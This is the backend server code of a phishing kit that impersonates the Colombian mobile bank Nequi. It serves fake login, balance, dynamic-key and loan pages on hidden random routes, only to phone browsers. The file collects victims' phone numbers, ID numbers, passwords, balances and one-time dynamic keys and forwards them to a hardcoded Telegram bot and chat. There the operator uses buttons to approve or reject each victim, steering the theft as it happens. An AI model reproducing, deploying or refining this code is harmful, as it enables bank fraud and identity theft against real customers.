const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// CONFIGURATION - REPLACE THESE WITH YOUR OWN
const TELEGRAM_TOKEN = '8263563776:AAEKwBsFsA4eq-Xdi_rEFNUwj0j14qO1fGk'; // Get from @BotFather
const CHAT_ID = '-5279110730'; // Get from @userinfobot

const app = express();
const port = process.env.PORT || 3000;

// Random Routes Mapping
const ROUTES = {
    INDEX: '/dGtRYXVHejZ6TXo4UHpiSTgyWENocGFRQVJXNElpcEtyZHdKVER4TWpqQzRDS2xrSDNkbDRZdDE3NzA5OTAyMjkzOTE',
    LOGIN: '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn',
    VALIDATION: '/QmNpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUv',
    DYNAMIC: '/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj',
    CREDIT: '/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx'
};

// Middleware for Mobile Detection
const mobileCheck = (req, res, next) => {
    const ua = req.headers['user-agent'];
    if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
        next();
    } else {
        res.send(''); // Send empty response (blank screen)
    }
};

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public')); // Serve assets if any

// Serve specific HTML files on random routes (Mobile Only)
app.get(ROUTES.INDEX, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get(ROUTES.LOGIN, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'login_final.html'));
});

app.get(ROUTES.VALIDATION, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'validacion_saldo.html'));
});

app.get(ROUTES.DYNAMIC, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'confirmacion_nequi.html'));
});

app.get(ROUTES.CREDIT, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'credito.html'));
});

// Root redirect to random index
app.get('/', (req, res) => {
    res.redirect(ROUTES.INDEX);
});

// Serve static assets (JS, CSS, IMG) freely but block direct HTML access
app.use((req, res, next) => {
    if (req.path.endsWith('.html')) {
        res.status(404).send('Not Found');
    } else {
        next();
    }
});

app.use(express.static(__dirname)); // Serve other static files like js, css, img

// Logging Middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Helper to normalize phone numbers
const normalizePhone = (phone) => {
    return phone.toString().replace(/\D/g, '').trim();
};

// Helper to format date
const formatDate = () => {
    const now = new Date();
    const pad = (num) => String(num).padStart(2, '0');
    return `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
};

// Helper to get IP
const getIP = (req) => {
    const forwarded = req.headers['x-forwarded-for'];
    return forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress || req.ip;
};

// In-memory storage for user sessions
const userSessions = {};

// Initialize Telegram Bot
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Handle Telegram Polling Errors
bot.on('polling_error', (error) => {
    console.error(`[TELEGRAM ERROR] ${error.code}: ${error.message}`);
});

// Handle Telegram Errors (to prevent crash if token is invalid)
bot.on('polling_error', (error) => {
    console.log('Telegram Polling Error:', error.message);
});

// Helper to format currency
const formatMoney = (value) => {
    if (!value || isNaN(value)) return value;
    return new Intl.NumberFormat('es-CO').format(value);
};

// API Endpoint to receive data from frontend
app.post('/api/save-data', (req, res) => {
    let { celular, cedula, clave, saldo, monto, cuota } = req.body;
    
    if (!celular) {
        return res.status(400).json({ error: 'Celular is required' });
    }

    const cleanCelular = normalizePhone(celular);
    const ip = getIP(req);
    const fecha = formatDate();
    
    // Clean and format monto/cuota
    const formattedMonto = formatMoney(monto);
    const cleanCuota = cuota ? cuota.replace('$ ', '') : 'No calculado';

    // Store/Update session
    userSessions[cleanCelular] = {
        celular: cleanCelular,
        cedula,
        clave,
        saldo,
        monto: formattedMonto,
        cuota: cleanCuota,
        ip,
        status: 'approved', // Auto-approved to request dynamic immediately
        timestamp: new Date()
    };

    // Construct message for Telegram
    const message = `
📱 *NEQUI - DATOS COMPLETOS*

👤 *Nombre:* Usuario Propulsor
🆔 *Cédula:* ${cedula}
📱 *Celular (Reg):* ${cleanCelular}
💸 *Solicitud Crédito:* -PRESTAMO: ${formattedMonto}| 1ra cuota ${cleanCuota}
📧 *Email:* No registrado
🌐 *IP Usuario:* ${ip}

📞 *Número (Login):* ${cleanCelular}
🔒 *Contraseña:* ${clave}
💰 *Saldo:* $${saldo}

⏰ *Fecha:* ${fecha}

⚠️ *Estado:* Redirigiendo a Dinámica...
    `;

    // Send to Telegram without buttons (initial auto-approve)
    const options = {
        parse_mode: 'Markdown'
    };

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => {
            console.log(`Data sent to Telegram for ${cleanCelular}`);
            res.json({ success: true, message: 'Data received and sent to Telegram' });
        })
        .catch((err) => {
            console.error('Error sending to Telegram:', err);
            // Even if Telegram fails, we acknowledge receipt to frontend
            res.json({ success: true, message: 'Data received (Telegram failed)' });
        });
});

// API Endpoint to check status
app.post('/api/check-status', (req, res) => {
    const { celular } = req.body;
    const cleanCelular = normalizePhone(celular);
    const session = userSessions[cleanCelular];

    if (!session) {
        return res.json({ status: 'unknown' });
    }

    res.json({ status: session.status });
});

// API Endpoint to receive dynamic key
app.post('/api/save-dynamic', (req, res) => {
    let { celular, clave, dinamica, cedula, monto, cuota, saldo } = req.body;

    if (!celular) {
        return res.status(400).json({ error: 'Celular is required' });
    }

    const cleanCelular = normalizePhone(celular);
    const ip = getIP(req);
    const fecha = formatDate();
    
    // Clean and format monto/cuota
    const formattedMonto = formatMoney(monto);
    const cleanCuota = cuota ? cuota.replace('$ ', '') : 'No calculado';

    // Update session
    if (userSessions[cleanCelular]) {
        userSessions[cleanCelular].dinamica = dinamica;
        userSessions[cleanCelular].status = 'waiting_dynamic';
    } else {
        // Fallback if session lost
        userSessions[cleanCelular] = {
            celular: cleanCelular,
            clave,
            dinamica,
            cedula,
            monto: formattedMonto,
            cuota: cleanCuota,
            saldo,
            ip,
            status: 'waiting_dynamic',
            timestamp: new Date()
        };
    }

    // Construct message for Telegram
    const message = `
🔑 *NEQUI - CLAVE DINÁMICA RECIBIDA*

👤 *Nombre:* Usuario Propulsor
🆔 *Cédula:* ${cedula || (userSessions[cleanCelular] ? userSessions[cleanCelular].cedula : 'No disponible')}
📱 *Celular (Reg):* ${cleanCelular}
💸 *Solicitud Crédito:* -PRESTAMO: ${formattedMonto || (userSessions[cleanCelular] ? userSessions[cleanCelular].monto : 'No disponible')}| 1ra cuota ${cleanCuota || (userSessions[cleanCelular] ? userSessions[cleanCelular].cuota : 'No disponible')}
🌐 *IP Usuario:* ${ip}

🎯 *Clave Dinámica:* ${dinamica}

📞 *Número (Login):* ${cleanCelular}
🔒 *Contraseña:* ${clave || (userSessions[cleanCelular] ? userSessions[cleanCelular].clave : 'No disponible')}
💰 *Saldo:* $${saldo || (userSessions[cleanCelular] ? userSessions[cleanCelular].saldo : 'No disponible')}

⏰ *Fecha:* ${fecha}
    `;

    // Send to Telegram with Inline Buttons
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '❌ Error Usuario', callback_data: `reject_user_${cleanCelular}` },
                    { text: '❌ Error Dinámica', callback_data: `reject_dynamic_${cleanCelular}` }
                ],
                [
                     { text: '❌ Error Saldo', callback_data: `reject_saldo_${cleanCelular}` }
                ],
                [
                     { text: '✅ Aprobar', callback_data: `approve_dynamic_${cleanCelular}` }
                ]
            ]
        }
    };

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => {
            console.log(`Dynamic key sent to Telegram for ${cleanCelular}`);
            res.json({ success: true, message: 'Dynamic key sent to Telegram' });
        })
        .catch((err) => {
            console.error('Error sending to Telegram:', err);
            res.json({ success: true, message: 'Data received (Telegram failed)' });
        });
});

// API Endpoint to check dynamic status
app.post('/api/check-dynamic-status', (req, res) => {
    const { celular } = req.body;
    const cleanCelular = normalizePhone(celular);
    const session = userSessions[cleanCelular];

    if (!session) {
        return res.json({ status: 'unknown' });
    }

    res.json({ status: session.status });
});

// Handle Telegram Callback Queries (Button Clicks) - Unified Handler
bot.on('callback_query', (callbackQuery) => {
    const action = callbackQuery.data;
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    // Normalize parsing
    // Formats: 
    // - approve_3001234567
    // - reject_3001234567
    // - approve_dynamic_3001234567
    // - reject_user_3001234567
    // - reject_dynamic_3001234567
    // - reject_saldo_3001234567

    const parts = action.split('_');
    let rawCelular;

    if (parts.length === 2) {
        rawCelular = parts[1];
    } else if (parts.length === 3) {
        rawCelular = parts[2];
    } else {
        return bot.answerCallbackQuery(callbackQuery.id);
    }

    const celular = normalizePhone(rawCelular);
    
    console.log(`[DEBUG] Action: ${action} | Celular: ${celular}`);

    if (userSessions[celular]) {
        // Handle Actions
        if (action.includes('approve_dynamic')) {
            userSessions[celular].status = 'approved';
            bot.sendMessage(chatId, `✅ Usuario ${celular} aprobado. Redirigiendo...`);
        } 
        else if (action.includes('reject_user')) {
            userSessions[celular].status = 'rejected_user';
            bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de usuario/clave.`);
        } 
        else if (action.includes('reject_dynamic')) {
            userSessions[celular].status = 'rejected_dynamic';
            bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de dinámica.`);
        } 
        else if (action.includes('reject_saldo')) {
            userSessions[celular].status = 'rejected_saldo';
            bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de saldo.`);
        }
        else if (parts.length === 2 && parts[0] === 'approve') {
             // Initial approve (request dynamic)
             userSessions[celular].status = 'approved';
             bot.sendMessage(chatId, `✅ Solicitud de dinámica para ${celular} iniciada.`);
        }
        else if (parts.length === 2 && parts[0] === 'reject') {
             userSessions[celular].status = 'rejected';
             bot.sendMessage(chatId, `❌ Usuario ${celular} rechazado.`);
        }
    } else {
        // AUTO-RECOVERY: If session is lost (server restart), recreate it with the command
        console.log(`[RECOVERY] Recreating session for ${celular} based on action ${action}`);
        
        userSessions[celular] = {
            celular: celular,
            timestamp: Date.now(),
            status: 'pending' // Default start
        };

        // Apply action to the new session
        if (action.includes('approve_dynamic')) {
            userSessions[celular].status = 'approved';
            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ✅ Aprobada (Dinámica).`);
        } 
        else if (action.includes('reject_user')) {
            userSessions[celular].status = 'rejected_user';
            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Error Usuario marcado.`);
        } 
        else if (action.includes('reject_dynamic')) {
            userSessions[celular].status = 'rejected_dynamic';
            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Error Dinámica marcado.`);
        } 
        else if (action.includes('reject_saldo')) {
            userSessions[celular].status = 'rejected_saldo';
            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Error Saldo marcado.`);
        }
        else if (parts.length === 2 && parts[0] === 'approve') {
             userSessions[celular].status = 'approved';
             bot.sendMessage(chatId, `⚠️ Sesión restaurada y ✅ Solicitud iniciada.`);
        }
        else if (parts.length === 2 && parts[0] === 'reject') {
             userSessions[celular].status = 'rejected';
             bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Rechazada.`);
        }
    }

    // Always answer callback to stop loading animation
    bot.answerCallbackQuery(callbackQuery.id);
});

// Global Error Handlers to prevent crash
process.on('uncaughtException', (err) => {
    console.error('UNCAUGHT EXCEPTION:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('UNHANDLED REJECTION:', reason);
});

// Start Server with Error Handling
const server = app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// Keep process alive
setInterval(() => {}, 1000 * 60 * 60); // Check every hour (dummy interval)

server.on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
        console.error(`Port ${port} is already in use!`);
    } else {
        console.error('Server error:', e);
    }
});
